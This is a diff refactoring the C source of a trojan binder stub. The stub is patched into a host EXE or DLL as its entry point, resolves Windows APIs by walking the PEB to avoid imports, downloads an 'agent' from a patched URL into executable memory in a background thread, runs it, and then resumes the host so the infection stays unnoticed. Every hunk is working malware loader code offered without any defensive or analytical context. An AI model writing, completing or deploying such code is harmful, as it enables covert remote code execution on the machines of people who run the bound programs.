@@ -13,10 +13,11 @@
  * Two fields are patched by the binder at bind time (both ASCII-findable so the
  * shared LoaderUrlPatcher works):
  *   - SHELLCODE_URL_PLACEHOLDER : 256-byte slot holding the agent URL.
- *   - C2OEPRAV + 4 bytes        : the host's original entry-point RVA (uint32 LE).
+ *   - C2OEPRAV + 4 bytes        : the host's original entry-point RVA (uint32 LE),
+ *                                 written over the sentinel's last 4 bytes.
  *
- * Build (CI): mingw gcc -ffreestanding -fPIC ... then ld --oformat binary →
- * stub-x64.bin / stub-x86.bin. See stub.ld + release.yml.
+ * Build (CI): mingw gcc -ffreestanding ... then objcopy -O binary →
+ * stub-x64-exe.bin / stub-x64-dll.bin. See stub.ld + release.yml.
  */
 
 #include <intrin.h> /* provides __readgsqword / __readfsdword as inline intrinsics (no CRT) */
@@ -27,20 +28,24 @@
 #if defined(BUILD_FOR_DLL) && defined(BUILD_FOR_EXE)
 #error "Define only one of BUILD_FOR_DLL or BUILD_FOR_EXE, not both."
 #endif
+#if !defined(BUILD_FOR_DLL) && !defined(BUILD_FOR_EXE)
+#error "Define exactly one of BUILD_FOR_DLL or BUILD_FOR_EXE."
+#endif
 
+/* ── Arch-specific PEB/Ldr + PE-layout offsets ─────────────────────────────── */
 #ifdef __x86_64__
 typedef unsigned long long uptr;
 #define PEB() ((uptr)__readgsqword(0x60))
-#define LDR_OFF 0x18
-#define INMEM_OFF 0x20
-#define INLOAD_OFF 0x10
-#define DBASE_INMEM 0x20    /* DllBase offset from an InMemoryOrderLinks node */
-#define BASENAME_INMEM 0x48 /* BaseDllName (UNICODE_STRING) offset from an InMemoryOrderLinks node */
-#define BUFPTR_OFF 0x08     /* Buffer field offset within a UNICODE_STRING (ptr-aligned) */
-#define DBASE_INLOAD 0x30   /* DllBase offset from an InLoadOrderLinks node   */
-#define EXPDIR_OFF 0x88     /* export data dir RVA field, from e_lfanew       */
+#define LDR_OFF 0x18        /* PEB->Ldr                                              */
+#define INMEM_OFF 0x20      /* &Ldr.InMemoryOrderModuleList sentinel                 */
+#define INLOAD_OFF 0x10     /* &Ldr.InLoadOrderModuleList sentinel                   */
+#define DBASE_INMEM 0x20    /* DllBase, from an InMemoryOrderLinks node              */
+#define BASENAME_INMEM 0x48 /* BaseDllName (UNICODE_STRING), from an InMemoryOrderLinks node */
+#define BUFPTR_OFF 0x08     /* Buffer field within a UNICODE_STRING (ptr-aligned)     */
+#define DBASE_INLOAD 0x30   /* DllBase, from an InLoadOrderLinks node                */
+#define EXPDIR_OFF 0x88     /* export-directory RVA slot (DataDirectory[0]) at base+e_lfanew */
 #else
-typedef unsigned long long uptr;
+typedef unsigned long uptr; /* 4-byte pointer width on x86 (deferred target)         */
 #define PEB() ((uptr)__readfsdword(0x30))
 #define LDR_OFF 0x0C
 #define INMEM_OFF 0x14
@@ -52,11 +57,25 @@ typedef unsigned long long uptr;
 #define EXPDIR_OFF 0x78
 #endif
 
+/* ── Generic Win32 / PE numeric constants ──────────────────────────────────── */
 typedef unsigned int u32;
 typedef unsigned short u16;
 
+#define E_LFANEW_OFF 0x3c  /* PE-signature offset field, from image base   */
+#define EXP_NUMNAMES 0x18  /* NumberOfNames field in the export directory  */
+#define EXP_ADDRFUNCS 0x1c /* AddressOfFunctions RVA field                 */
+#define EXP_ADDRNAMES 0x20 /* AddressOfNames RVA field                     */
+#define EXP_ADDRORDS 0x24  /* AddressOfNameOrdinals RVA field              */
+
+#define DLL_PROCESS_ATTACH 1
+
+#define MEM_COMMIT_RESERVE 0x3000     /* MEM_COMMIT | MEM_RESERVE                     */
+#define PAGE_RWX 0x40                 /* PAGE_EXECUTE_READWRITE                       */
+#define AGENT_BUF_SIZE 0x400000       /* 4 MiB max downloaded agent                   */
+#define AGENT_READ_CHUNK 0x100000     /* 1 MiB per InternetReadFile call              */
+#define INET_OPENURL_FLAGS 0x84000000 /* INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE */
+
 /* ── API function-pointer types ───────────────────────────────────────────── */
-typedef void *(WINAPI *GetProcAddress_t)(void *hModule, const char *name);
 typedef void *(WINAPI *LoadLibraryA_t)(const char *lib);
 
 typedef void *(WINAPI *VirtualAlloc_t)(
@@ -104,7 +123,7 @@ struct API
     InternetReadFile_t pInternetReadFile;
 };
 
-/* ── Helpers ──────────────────────────────────────────────────────────────── */
+/* ── String helpers ────────────────────────────────────────────────────────── */
 
 static int streq(const char *a, const char *b)
 {
@@ -150,6 +169,8 @@ static int name_ieq(const u16 *wide, u32 wchars, const char *ascii)
     return ascii[i] == 0;
 }
 
+/* ── Module + export resolution (PEB/Ldr walk, no imports) ─────────────────── */
+
 /* GetModuleHandle-style lookup: walk PEB.Ldr.InMemoryOrderModuleList and return
  * the base of the loaded module whose basename matches `name` (case-insensitive,
  * extension optional). Returns 0 if not found. Matching by name (not fixed list
@@ -181,14 +202,16 @@ static uptr kernel32_base(void)
     return get_module_base("kernel32");
 }
 
+/* Walk a module's PE export table and return the address of the named export,
+ * or 0 if not found. */
 static void *resolve_export(uptr base, const char *name)
 {
-    u32 e_lfanew = *(u32 *)(base + 0x3c);
+    u32 e_lfanew = *(u32 *)(base + E_LFANEW_OFF);
     uptr expDir = base + *(u32 *)(base + e_lfanew + EXPDIR_OFF);
-    u32 numNames = *(u32 *)(expDir + 0x18);
-    uptr names = base + *(u32 *)(expDir + 0x20);
-    uptr funcs = base + *(u32 *)(expDir + 0x1c);
-    uptr ords = base + *(u32 *)(expDir + 0x24);
+    u32 numNames = *(u32 *)(expDir + EXP_NUMNAMES);
+    uptr names = base + *(u32 *)(expDir + EXP_ADDRNAMES);
+    uptr funcs = base + *(u32 *)(expDir + EXP_ADDRFUNCS);
+    uptr ords = base + *(u32 *)(expDir + EXP_ADDRORDS);
 
     for (u32 i = 0; i < numNames; i++)
     {
@@ -202,111 +225,165 @@ static void *resolve_export(uptr base, const char *name)
     return 0;
 }
 
-/* ── Background download + execute ────────────────────────────────────────── */
-char g_url[256] = "SHELLCODE_URL_PLACEHOLDER";
+/* ── API resolution ────────────────────────────────────────────────────────── */
 
-static u32 download_thread(void *param)
+/* Resolve the kernel32-sourced slots of `api` (LoadLibraryA, VirtualAlloc).
+ * Returns 0 if kernel32 or either export is unavailable. */
+static int resolve_kernel32_apis(struct API *api)
 {
-    struct API api;
-
     uptr k32 = kernel32_base();
     if (!k32)
         return 0;
 
-    api.pLoadLibraryA = (LoadLibraryA_t)resolve_export(k32, "LoadLibraryA");
+    api->pLoadLibraryA = (LoadLibraryA_t)resolve_export(k32, "LoadLibraryA");
+    api->pVirtualAlloc = (VirtualAlloc_t)resolve_export(k32, "VirtualAlloc");
+    return api->pLoadLibraryA != 0 && api->pVirtualAlloc != 0;
+}
 
-    api.pVirtualAlloc = (VirtualAlloc_t)resolve_export(k32, "VirtualAlloc");
-
-    uptr wininet = (uptr)api.pLoadLibraryA("wininet.dll");
-    if (wininet)
-    {
-        api.pInternetOpenA = (InternetOpenA_t)resolve_export(wininet, "InternetOpenA");
-        api.pInternetOpenUrlA = (InternetOpenUrlA_t)resolve_export(wininet, "InternetOpenUrlA");
-        api.pInternetReadFile = (InternetReadFile_t)resolve_export(wininet, "InternetReadFile");
-    }
-
-    void *buf = api.pVirtualAlloc(0, 0x400000, 0x3000 /*COMMIT|RESERVE*/, 0x40 /*RWX*/);
-    if (!buf)
+/* Load wininet.dll and resolve its three slots in `api`. Leaves the slots zero
+ * and returns 0 if wininet (or any export) is unavailable. */
+static int resolve_wininet_apis(struct API *api)
+{
+    uptr wininet = (uptr)api->pLoadLibraryA("wininet.dll");
+    if (!wininet)
         return 0;
 
-    void *hInternet = api.pInternetOpenA(0, 0, 0, 0, 0);
+    api->pInternetOpenA = (InternetOpenA_t)resolve_export(wininet, "InternetOpenA");
+    api->pInternetOpenUrlA = (InternetOpenUrlA_t)resolve_export(wininet, "InternetOpenUrlA");
+    api->pInternetReadFile = (InternetReadFile_t)resolve_export(wininet, "InternetReadFile");
+    return api->pInternetOpenA != 0 && api->pInternetOpenUrlA != 0 && api->pInternetReadFile != 0;
+}
+
+/* ── Background download + execute ────────────────────────────────────────── */
+char g_url[256] = "SHELLCODE_URL_PLACEHOLDER";
+
+/* Allocate the RWX landing buffer for the agent. Returns 0 on failure. */
+static void *alloc_agent_buffer(struct API *api)
+{
+    return api->pVirtualAlloc(0, AGENT_BUF_SIZE, MEM_COMMIT_RESERVE, PAGE_RWX);
+}
+
+/* Download the agent from `url` into `buf` (capped at AGENT_BUF_SIZE); returns
+ * the number of bytes written (0 if nothing was fetched or a handle was denied). */
+static uptr fetch_agent(struct API *api, const char *url, void *buf)
+{
+    void *hInternet = api->pInternetOpenA(0, 0, 0, 0, 0);
     if (!hInternet)
         return 0;
 
-    void *hUrl = api.pInternetOpenUrlA(hInternet, g_url, 0, 0, 0x84000000 /*RELOAD|NO_CACHE_WRITE*/, 0);
+    void *hUrl = api->pInternetOpenUrlA(hInternet, url, 0, 0, INET_OPENURL_FLAGS, 0);
     if (!hUrl)
         return 0;
+
     uptr off = 0;
     u32 got = 0;
     do
     {
-        api.pInternetReadFile(hUrl, (char *)buf + off, 0x100000, &got);
+        api->pInternetReadFile(hUrl, (char *)buf + off, AGENT_READ_CHUNK, &got);
         off += got;
-    } while (got && off < 0x400000);
+    } while (got && off < AGENT_BUF_SIZE);
 
-    if (off)
-        return ((u32 (*)(void))buf)(); /* run the PIC agent */
-    return 0;
+    return off;
 }
 
-/* ── Entry (placed first in .text via section attr) ───────────────────────── */
-
-#if defined(BUILD_FOR_DLL)
-
-/* DLL entry: the binder wires this stub in as the host DLL's DllMain. hinstDLL
- * is the image base; on DLL_PROCESS_ATTACH (fdwReason == 1) we spawn the stager
- * thread, then tail-call the original DllMain at base + OEP RVA. */
-__attribute__((section(".text.start"), used)) int WINAPI _start(void *hinstDLL,
-                                                                int fdwReason,
-                                                                void *lpReserved)
+/* Hand control to the downloaded position-independent agent at `buf`. Its return
+ * value becomes the stager thread's exit code. */
+static u32 run_agent(void *buf)
 {
-    if (fdwReason == 1)
-    {
-        struct API api;
-        uptr k32 = kernel32_base();
-        if (!k32)
-            return 0;
-        api.pCreateThread = (CreateThread_t)resolve_export(k32, "CreateThread");
-
-        if (api.pCreateThread)
-            api.pCreateThread(0, 0, (u32 (*)(void *))download_thread, 0, 0, 0);
-    }
-
-    volatile char c2_oep[12] = "C2OEPRAV";   /* volatile: prevent the -O2 constant-fold that erased this marker */
-    u32 oep = *(volatile u32 *)(c2_oep + 4); /* original entry-point RVA (patched by binder) */
-    return ((int WINAPI (*)(void *, int, void *))((uptr)hinstDLL + oep))(hinstDLL, fdwReason, lpReserved);
+    return ((u32 (*)(void))buf)();
 }
 
-#elif defined(BUILD_FOR_EXE)
-
-/* EXE entry: the binder repoints the host EXE's entry point here. An EXE entry
- * receives no image-base argument, so derive the base from
- * PEB.Ldr.InLoadOrderModuleList[0] (the EXE itself), spawn the stager thread,
- * then jump to the original OEP. */
-__attribute__((section(".text.start"), used)) void _start(void)
+/* Stager thread body: resolve APIs, fetch the agent, run it. */
+static u32 download_thread(void *param)
 {
-    struct API api;
+    (void)param;
+    struct API api = {0};
+
+    if (!resolve_kernel32_apis(&api))
+        return 0;
+    if (!resolve_wininet_apis(&api))
+        return 0;
+
+    void *buf = alloc_agent_buffer(&api);
+    if (!buf)
+        return 0;
+
+    if (!fetch_agent(&api, g_url, buf))
+        return 0;
+    return run_agent(buf);
+}
+
+/* ── Entry helpers ─────────────────────────────────────────────────────────── */
+
+/* Spawn the stager thread (resolves CreateThread from kernel32). No-op if
+ * kernel32 or CreateThread can't be resolved. */
+static void spawn_download_thread(void)
+{
     uptr k32 = kernel32_base();
     if (!k32)
         return;
 
-    api.pCreateThread = (CreateThread_t)resolve_export(k32, "CreateThread");
+    CreateThread_t pCreateThread = (CreateThread_t)resolve_export(k32, "CreateThread");
+    if (pCreateThread)
+        pCreateThread(0, 0, (u32 (*)(void *))download_thread, 0, 0, 0);
+}
 
-    if (api.pCreateThread)
-        api.pCreateThread(0, 0, (u32 (*)(void *))download_thread, &api, 0, 0);
+/* Read the host's original entry-point RVA. The binder patches this 4-byte LE
+ * value into the slot at marker+4 (overwriting the sentinel's last 4 bytes) at
+ * bind time. `volatile` defeats the -O2 constant-fold that would otherwise erase
+ * the sentinel, keeping it inline and ASCII-discoverable in the flat binary. */
+static u32 read_oep_rva(void)
+{
+    volatile char marker[12] = "C2OEPRAV";
+    return *(volatile u32 *)(marker + 4);
+}
 
-    /* Resume the host: exe base (PEB.Ldr.InLoadOrderModuleList[0]) + patched OEP RVA. */
+#if defined(BUILD_FOR_EXE)
+/* Image base of the host EXE = first node of PEB.Ldr.InLoadOrderModuleList.
+ * (DLL builds receive the base as the hinstDLL argument, so this is EXE-only.) */
+static uptr exe_image_base(void)
+{
     uptr peb = PEB();
     uptr ldr = *(uptr *)(peb + LDR_OFF);
     uptr first = *(uptr *)(ldr + INLOAD_OFF);
-    uptr base = *(uptr *)(first + DBASE_INLOAD);
-
-    volatile char c2_oep[12] = "C2OEPRAV";
-    u32 oep = *(volatile u32 *)(c2_oep + 4);
-    ((void (*)(void))(base + oep))();
-
-    for (;;)
-    {
-    } /* never reached for an EXE entry */
+    return *(uptr *)(first + DBASE_INLOAD);
 }
 #endif
+
+/* ── Entry (placed first in .text via section attr) ───────────────────────── */
+
+/* Single shared entry point. The binder repoints the host's entry here for
+ * either image kind. The signature matches the DLL/DllMain contract (hinstDLL is
+ * the image base, fdwReason the reason code, lpReserved reserved); an EXE entry
+ * is called with no meaningful arguments, so the EXE path ignores all three and
+ * derives its base from the PEB instead. (On x64 WINAPI == the default ABI, and
+ * an unused parameter costs no code, so one signature serves both.) */
+__attribute__((section(".text.start"), used)) int WINAPI _start(void *hinstDLL,
+                                                                int fdwReason,
+                                                                void *lpReserved)
+{
+#if defined(BUILD_FOR_DLL)
+    /* DllMain: fire the stager once on attach, then resume the original below. */
+    if (fdwReason == DLL_PROCESS_ATTACH)
+        spawn_download_thread();
+#else /* BUILD_FOR_EXE */
+    /* EXE entry: no usable arguments — mark them unused and spawn unconditionally. */
+    (void)hinstDLL;
+    (void)fdwReason;
+    (void)lpReserved;
+    spawn_download_thread();
+#endif
+
+    u32 oep = read_oep_rva();
+
+#if defined(BUILD_FOR_DLL)
+    /* Tail-call the original DllMain at base + OEP RVA. */
+    return ((int WINAPI (*)(void *, int, void *))((uptr)hinstDLL + oep))(hinstDLL, fdwReason, lpReserved);
+#else
+    /* Jump to the original EXE entry; control never returns here. */
+    ((void (*)(void))(exe_image_base() + oep))();
+    for (;;)
+    {
+    }
+#endif
+}
